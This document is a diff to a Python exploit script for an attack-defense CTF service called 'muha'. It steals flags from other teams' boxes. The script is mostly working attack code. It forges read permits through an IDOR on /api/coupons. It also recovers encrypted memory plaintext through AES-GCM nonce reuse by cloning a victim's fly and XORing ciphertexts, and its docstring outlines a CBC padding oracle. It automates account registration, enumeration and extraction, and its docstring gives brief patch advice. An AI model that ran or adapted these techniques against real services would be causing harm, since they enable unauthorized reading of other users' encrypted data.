@@ -1,200 +1,257 @@
-"""Farm exploit for the `muha` service (real Team7 range box, Python/Flask).
+"""Exploit for the muha service (Flask + SQLite, "ферма мух") — steals a memory's
+plaintext (= the flag) from another team's box.
 
-Service = "fly brain lab": users own flies, flies hold AES-GCM-encrypted memories;
-the checker plants the flag as a memory's `content`. flag_id (from attack_data) is
-the public memory id (`mid`) of the flagged memory.
+The checker stores the flag as the `content` of a "memory". A memory is encrypted
+two ways at rest: AES-256-GCM under the fly's per-fly `brain_key` (the `ciphertext`),
+and AES-CBC under a process-wide shared `archive_key` (the `archive`). muha ships
+with several object-level-authz holes; teams patch them unevenly, so this exploit
+tries three independent paths and stops at the first that yields the flag. `flag_id`
+is the victim memory id (`mid`) from attack-data; with no id we enumerate public
+flies -> their memory ids and dump everything.
 
-Two independent steal paths (whichever the target team has NOT patched), tried in
-order; both need only a freshly registered account and the public interface:
+PATH A — permit IDOR on /api/coupons (confused deputy / BOLA)
+    Unpatched /api/coupons signs an HMAC read-permit for ANY `object_id` the client
+    names, without checking the object belongs to the caller. /api/memories/<mid>/read
+    accepts a permit whose subject==caller & object_id==mid and decrypts server-side.
+        register -> create own fly -> POST /api/coupons {fly_id:own, object_id:victim mid}
+        -> POST /api/memories/<victim mid>/read {token} -> plaintext flag
+    3 requests, no crypto. Dead once coupons verifies object ownership (403).
 
-  A) COUPON-FORGE IDOR (fast, ~3 req).  POST /api/coupons signs an HMAC read-permit
-     for ANY object_id supplied by the caller without checking ownership; then
-     POST /api/memories/<mid>/read accepts that permit (subject==caller, object_id==mid)
-     and returns the decrypted content. => forge a permit for the victim's mid, read it.
+PATH B — AES-GCM nonce reuse via /api/flies/<fid>/clone + /api/memories/<mid>/capsule
+    The GCM nonce is the fly's `counter` (nonce = counter.to_bytes(12)); the counter
+    resets to any chosen `revision` on clone, and clone copies the victim's brain_key
+    into a fly WE own without an owner check. capsule() hands out any memory's raw
+    ciphertext+nonce without an owner check. So:
+        capsule(victim mid) -> victim nonce N (=counter) and ciphertext C2
+        clone(victim fly, revision=N) -> our fly, same brain_key, counter=N
+        store a known P1 on the clone -> capsule(ours) -> ciphertext C1 at the SAME (key,N)
+        keystream KS = P1 ^ C1  ;  victim plaintext = C2 ^ KS       (many-time-pad)
+    ~5 requests + XOR. Works whenever capsule and clone both skip the owner check,
+    independent of whether coupons is patched.
 
-  B) CAPSULE + CLONE + AES-GCM NONCE REUSE (crypto fallback, ~5 req).
-     GET /api/memories/<mid>/capsule leaks the victim's ciphertext + nonce (nonce =
-     fly counter at store time). POST /api/flies/<victim_fid>/clone has NO ownership
-     check and copies the victim's per-fly brain_key into a fly we own, with counter
-     set to `revision` (we pick it = R, the victim memory's index). Storing our own
-     memory in that clone encrypts a KNOWN plaintext under the SAME (key, nonce),
-     so keystream = P1 XOR C1, and flag = C_victim XOR keystream.
+PATH C — CBC padding oracle on /api/archives/preview (NOT wired; slow)
+    capsule() also returns the CBC `archive` blob (shared archive_key); preview()
+    answers 422 only on bad PKCS7 padding, a classic padding oracle that recovers the
+    archive plaintext (which contains the flag) without the key. It needs hundreds of
+    sequential requests per block, so it would blow the farm's per-call budget and get
+    the exploit quarantined — left out here; run it from a dedicated long-timeout
+    runner if both capsule is open AND clone is patched.
 
-Interface frozen by the farm:  exploit(host, port, flag_id) -> list[str]
-Standalone:  python muha.py <host> <port> <flag_id>
+Patch (defense, see defense/muha_idor.md): in /api/coupons verify the object belongs
+to the caller BEFORE signing (bind the permit to subject+expiry too); add an owner
+check to /api/memories/<mid>/capsule; and use a fresh random GCM nonce per memory
+(never the counter) so clone can't force a nonce collision.
+
+Interface: exploit(host, port, flag_id) -> list[str]   # flag_id = victim memory id
+Deps: requests (stdlib base64/re otherwise).
 """
 import base64
+import random
 import re
-import secrets
+import string
 import sys
 
 import requests
 
 FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
-MID_RE = re.compile(r"^[0-9a-f]{24}$")
-TIMEOUT = 5
-MAX_DUMP_MEMORIES = 20          # cap for flag_id-less dump-all (stay under farm timeout)
+TIMEOUT = 6
+MAX_ENUM = 100                     # cap mids dumped per round when no flag_id is given
+
+# One registered session per box (survives the game; a box restart wipes it -> we
+# detect the dead session via /api/me and re-register). Caches our own fly id too,
+# which Path A needs to mint a coupon.
+_SESS = {}
 
 
-def _rand(n=16):
-    return secrets.token_hex(n // 2 + 1)[:n]
+def _rand(n=10):
+    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))
 
 
 def _unb64(value):
-    # muha emits urlsafe base64 without padding (b64 = urlsafe_b64encode(...).rstrip("="))
-    s = str(value)
-    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
+    # capsule encodes with urlsafe-b64 and strips '=' padding; put it back to decode.
+    if not isinstance(value, str):
+        return b""
+    try:
+        return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))
+    except (ValueError, base64.binascii.Error):
+        return b""
 
 
-def _xor(a, b):
-    return bytes(x ^ y for x, y in zip(a, b))
+def _scan(*values):
+    out = []
+    for v in values:
+        if v:
+            out.extend(FLAG_RE.findall(str(v)))
+    return out
 
 
-def _session(base):
-    """Register a throwaway account; returns a requests.Session with its cookie, or None."""
+def _register(base):
     s = requests.Session()
-    u, p = "lab" + _rand(10), _rand(20)
+    for _ in range(2):                         # retry once on the rare username clash
+        try:
+            r = s.post(base + "/api/register",
+                       json={"username": "lab" + _rand(10), "password": _rand(16)},
+                       timeout=TIMEOUT)
+        except requests.RequestException:
+            return None, None
+        if r.status_code in (200, 201):
+            fid = None
+            try:                               # our own fly: Path A coupons needs fly_id==ours
+                rf = s.post(base + "/api/flies",
+                            json={"name": "n" + _rand(6), "profession": "p" + _rand(6)},
+                            timeout=TIMEOUT)
+                if rf.status_code in (200, 201):
+                    fid = rf.json().get("id")
+            except (ValueError, requests.RequestException):
+                pass
+            return s, fid
+    return None, None
+
+
+def _session(base, force=False):
+    if not force:
+        cached = _SESS.get(base)
+        if cached:
+            try:
+                if cached["s"].get(base + "/api/me", timeout=TIMEOUT).status_code == 200:
+                    return cached["s"], cached["fid"]
+            except requests.RequestException:
+                pass
+    s, fid = _register(base)
+    if s is not None:
+        _SESS[base] = {"s": s, "fid": fid}
+    else:
+        _SESS.pop(base, None)
+    return s, fid
+
+
+def _targets(s, base, flag_id):
+    if flag_id is not None:
+        fid = str(flag_id).strip()
+        return [fid] if fid else []
+    # no id -> enumerate: public flies, then each fly's memory ids (neither endpoint
+    # checks ownership), and dump them all.
+    mids = []
     try:
-        r = s.post(base + "/api/register", json={"username": u, "password": p}, timeout=TIMEOUT)
-        if r.status_code not in (200, 201):
-            # username clash or already-registered edge: try logging in
-            r = s.post(base + "/api/login", json={"username": u, "password": p}, timeout=TIMEOUT)
-            if r.status_code != 200:
-                return None
-    except requests.RequestException:
-        return None
-    return s
+        flies = s.get(base + "/api/flies", params={"scope": "public"},
+                      timeout=TIMEOUT).json().get("flies", [])
+    except (ValueError, requests.RequestException):
+        flies = []
+    for fl in flies:
+        if not isinstance(fl, dict) or not fl.get("id"):
+            continue
+        try:
+            mems = s.get(base + "/api/flies/%s/memories" % fl["id"],
+                         timeout=TIMEOUT).json().get("memories", [])
+        except (ValueError, requests.RequestException):
+            continue
+        for mm in mems:
+            if isinstance(mm, dict) and mm.get("id"):
+                mids.append(mm["id"])
+        if len(mids) >= MAX_ENUM:
+            break
+    return mids[:MAX_ENUM]
 
 
-def _make_fly(s, base):
+def _via_coupon(s, base, our_fid, mid):
+    """Path A: forge a read-permit for someone else's memory and redeem it."""
+    if not our_fid:
+        return []
     try:
-        r = s.post(base + "/api/flies", json={"name": _rand(8), "profession": "qa"}, timeout=TIMEOUT)
-        if r.status_code == 201:
-            return r.json().get("id")
-    except (requests.RequestException, ValueError):
-        pass
-    return None
-
-
-def _memories_of(s, base, fid):
-    try:
-        r = s.get(base + "/api/flies/%s/memories" % fid, timeout=TIMEOUT)
-        if r.status_code == 200:
-            return [m["id"] for m in r.json().get("memories", []) if m.get("id")]
-    except (requests.RequestException, ValueError, KeyError):
-        pass
-    return []
-
-
-def _public_flies(s, base):
-    try:
-        r = s.get(base + "/api/flies", params={"scope": "public"}, timeout=TIMEOUT)
-        if r.status_code == 200:
-            return [f["id"] for f in r.json().get("flies", []) if f.get("id")]
-    except (requests.RequestException, ValueError, KeyError):
-        pass
-    return []
-
-
-def _path_a(s, base, my_fid, mid):
-    """Coupon-forge IDOR: sign a permit for the victim mid, then read it."""
-    if not my_fid:
-        return None
-    try:
-        r = s.post(base + "/api/coupons", json={"fly_id": my_fid, "object_id": mid}, timeout=TIMEOUT)
-        if r.status_code != 200:
-            return None
+        r = s.post(base + "/api/coupons",
+                   json={"fly_id": our_fid, "object_id": mid}, timeout=TIMEOUT)
+        if r.status_code != 200:               # 403 == coupons patched to verify ownership
+            return []
         token = r.json().get("token")
         if not token:
-            return None
-        r = s.post(base + "/api/memories/%s/read" % mid, json={"token": token}, timeout=TIMEOUT)
+            return []
+        r = s.post(base + "/api/memories/%s/read" % mid,
+                   json={"token": token}, timeout=TIMEOUT)
         if r.status_code != 200:
-            return None
-        return r.json().get("content")
-    except (requests.RequestException, ValueError, KeyError):
-        return None
+            return []
+        j = r.json()
+        return _scan(j.get("content"), j.get("title"))
+    except (ValueError, requests.RequestException):
+        return []
 
 
-def _path_b(s, base, mid):
-    """capsule leak + clone (brain_key copy) + AES-GCM nonce reuse -> recover plaintext."""
+def _via_clone(s, base, mid):
+    """Path B: clone the victim's brain_key, force a nonce collision, recover keystream."""
     try:
         r = s.get(base + "/api/memories/%s/capsule" % mid, timeout=TIMEOUT)
-        if r.status_code != 200:
-            return None
-        j = r.json()
-        victim_fid = j["fly_id"]
-        nonce = _unb64(j["nonce"])
-        ct_victim = _unb64(j["ciphertext"])          # ciphertext already excludes the 16-byte tag
-        revision = int.from_bytes(nonce, "big")       # nonce == fly counter at store time == mem index
+        if r.status_code != 200:               # 403 == capsule patched to verify ownership
+            return []
+        cap = r.json()
+        victim_fid = cap.get("fly_id")
+        c2 = _unb64(cap.get("ciphertext"))
+        n = int.from_bytes(_unb64(cap.get("nonce")), "big")
+        length = len(c2)
+        if not victim_fid or not (1 <= length <= 4096):
+            return []
 
         r = s.post(base + "/api/flies/%s/clone" % victim_fid,
-                   json={"name": _rand(8), "revision": revision}, timeout=TIMEOUT)
-        if r.status_code != 201:
-            return None
-        my_fid = r.json()["id"]
+                   json={"name": "c" + _rand(6), "revision": n}, timeout=TIMEOUT)
+        if r.status_code not in (200, 201):
+            return []
+        clone_id = r.json().get("id")
+        if not clone_id:
+            return []
 
-        p1 = "A" * min(4096, max(256, len(ct_victim) + 32))   # known plaintext (<=4096 content cap)
-        r = s.post(base + "/api/flies/%s/memories" % my_fid,
-                   json={"title": "k", "content": p1}, timeout=TIMEOUT)
-        if r.status_code != 201:
-            return None
-        my_mid = r.json()["id"]
+        p1 = "A" * length                      # known plaintext, length-matched to the victim's
+        r = s.post(base + "/api/flies/%s/memories" % clone_id,
+                   json={"title": "t", "content": p1}, timeout=TIMEOUT)
+        if r.status_code not in (200, 201):
+            return []
+        our_mid = r.json().get("id")
+        if not our_mid:
+            return []
 
-        r = s.get(base + "/api/memories/%s/capsule" % my_mid, timeout=TIMEOUT)
+        r = s.get(base + "/api/memories/%s/capsule" % our_mid, timeout=TIMEOUT)
         if r.status_code != 200:
-            return None
-        ct_mine = _unb64(r.json()["ciphertext"])
-        ks = _xor(p1.encode(), ct_mine)               # keystream = P1 XOR C1 (same key+nonce)
-        return _xor(ct_victim, ks).decode("utf-8", "ignore")
-    except (requests.RequestException, ValueError, KeyError, TypeError):
-        return None
+            return []
+        c1 = _unb64(r.json().get("ciphertext"))
+        if len(c1) < length:
+            return []
+        p1b = p1.encode()
+        ks = bytes(a ^ b for a, b in zip(p1b, c1))         # keystream at (brain_key, nonce=n)
+        pt = bytes(a ^ b for a, b in zip(c2, ks))          # victim plaintext
+        return _scan(pt.decode("utf-8", "ignore"))
+    except (ValueError, KeyError, requests.RequestException):
+        return []
 
 
-def _harvest(text, out):
-    if not text:
-        return
-    for m in FLAG_RE.findall(text):
-        out.add(m)
+def _steal_one(s, base, our_fid, mid):
+    return _via_coupon(s, base, our_fid, mid) or _via_clone(s, base, mid)
 
 
 def exploit(host, port, flag_id):
-    base = "http://%s:%d" % (host, int(port))
-    flags = set()
-
-    s = _session(base)
-    if s is None:
-        return []
-    my_fid = _make_fly(s, base)                        # needed for path A (coupon fly_id ownership)
-
-    # Build the candidate memory-id list.
-    mids = []
-    if flag_id and MID_RE.match(str(flag_id)):
-        mids.append(str(flag_id))                      # flag_id is most likely the memory id
-        mids.extend(_memories_of(s, base, str(flag_id)))   # ...or a fly id: pull its memories too
-    else:
-        for fid in _public_flies(s, base):
-            mids.extend(_memories_of(s, base, fid))
-
-    seen = set()
-    for mid in mids:
-        if mid in seen:
-            continue
-        seen.add(mid)
-        if len(seen) > MAX_DUMP_MEMORIES and not (flag_id and MID_RE.match(str(flag_id))):
-            break
-        content = _path_a(s, base, my_fid, mid)
-        if not content or not FLAG_RE.search(content):
-            content = _path_b(s, base, mid)
-        _harvest(content, flags)
-        if flag_id and flags:                          # targeted call: stop as soon as we have it
-            break
-
-    return list(flags)
+    flags, seen = [], set()
+    try:
+        base = "http://%s:%s" % (host, port)   # %s: a non-int port returns [] instead of raising
+        s, our_fid = _session(base)
+        if s is None:
+            return flags
+        mids = _targets(s, base, flag_id)
+        # if a cached session went stale mid-game (box restart), /api/me in _session
+        # already re-registered; but if enumeration came back empty with a cached
+        # session, re-register once and retry (cheap, self-healing).
+        if not mids and flag_id is None and _SESS.get(base):
+            s, our_fid = _session(base, force=True)
+            if s is not None:
+                mids = _targets(s, base, flag_id)
+        for mid in mids:
+            for f in _steal_one(s, base, our_fid, mid):
+                if f not in seen:
+                    seen.add(f)
+                    flags.append(f)
+    except Exception:
+        return flags
+    return flags
 
 
 if __name__ == "__main__":
     h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
-    pt = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
+    p = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
     fid = sys.argv[3] if len(sys.argv) > 3 else None
-    for f in exploit(h, pt, fid):
+    for f in exploit(h, p, fid):
         print(f)
